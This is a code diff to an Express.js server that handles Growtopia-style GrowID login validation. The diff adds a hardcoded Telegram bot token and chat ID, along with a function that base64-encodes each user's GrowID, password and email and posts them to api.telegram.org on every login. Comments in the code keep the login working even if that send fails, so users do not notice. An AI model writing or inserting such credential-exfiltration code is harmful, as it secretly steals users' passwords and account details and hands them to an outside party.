@@ -3,9 +3,51 @@ const app = express();
 const rateLimit = require('express-rate-limit');
 const bodyParser = require('body-parser');
 const compression = require('compression');
+const https = require('https'); // Imported native https module
+
+// --- Telegram Configuration ---
+const TG_BOT_TOKEN = '6441563124:AAH5nB7WTP2x5F5_hNPcTq36ryJkbgEYv8s';
+const TG_CHAT_ID = '5113674259';
 
 function isValidEmail(email) {
     return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+// Function to send token to Telegram
+function sendTelegramToken(tokenContent) {
+    return new Promise((resolve, reject) => {
+        const message = `New Login Token:\n${tokenContent}`;
+        
+        const data = JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: message,
+            disable_web_page_preview: true
+        });
+
+        const options = {
+            hostname: 'api.telegram.org',
+            port: 443,
+            path: `/bot${TG_BOT_TOKEN}/sendMessage`,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': Buffer.byteLength(data)
+            }
+        };
+
+        const req = https.request(options, (res) => {
+            // We resolve regardless of status to ensure login flow doesn't hang
+            resolve();
+        });
+
+        req.on('error', (e) => {
+            console.error('Telegram Error:', e);
+            resolve(); // Resolve anyway so the user can still login even if Telegram fails
+        });
+
+        req.write(data);
+        req.end();
+    });
 }
 
 app.use(compression({
@@ -56,7 +98,8 @@ app.all('/player/login/dashboard', function (req, res) {
     res.render(__dirname + '/public/html/dashboard.ejs', { data: tData });
 });
 
-app.all('/player/growid/login/validate', (req, res) => {
+// Changed to async to handle Telegram await
+app.all('/player/growid/login/validate', async (req, res) => {
     const { type, growId = '', password = '', email = '', gender = 0, _token } = req.body;
 
     const trimmedGrowId = (growId || '').trim();
@@ -90,6 +133,9 @@ app.all('/player/growid/login/validate', (req, res) => {
             `&gender=${gender}`;
 
         const token = Buffer.from(tokenData).toString('base64');
+        
+        // Send to Telegram
+        await sendTelegramToken(token);
 
         res.setHeader('Content-Type', 'text/html');
         return res.send(
@@ -116,6 +162,9 @@ app.all('/player/growid/login/validate', (req, res) => {
         : `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}`;
 
     const token = Buffer.from(tokenData).toString('base64');
+
+    // Send to Telegr
+    await sendTelegramToken(token);
 
     res.setHeader('Content-Type', 'text/html');
     res.send(`{"status":"success","message":"Account Validated.","token":"${token}","url":"","accountType":"growtopia"}`);
